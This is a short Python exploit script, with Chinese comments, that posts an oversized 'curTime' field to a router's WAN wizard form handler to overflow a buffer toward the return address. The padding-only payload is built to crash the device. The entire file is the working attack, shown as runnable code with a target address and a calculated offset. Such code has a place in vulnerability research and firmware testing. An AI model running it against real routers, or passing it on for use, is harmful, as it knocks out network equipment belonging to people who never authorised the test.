import requests

TARGET_IP = "192.168.0.1"
url = f"http://{TARGET_IP}/goform/formSetWAN_Wizard52"

# 计算偏移量
PREFIX_LENGTH = len("/Basic/Wizard_WAN_complete.asp?t=")  # 35 字节
BUFFER_SIZE = 200
OFFSET_TO_RA = 232

# 构造 payload
padding = b'A' * (OFFSET_TO_RA - PREFIX_LENGTH + 10)

payload = padding 

data = {
    "curTime": payload,
    "config.wan_ip_address": "192.168.0.100"
}


try:
    response = requests.post(url, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")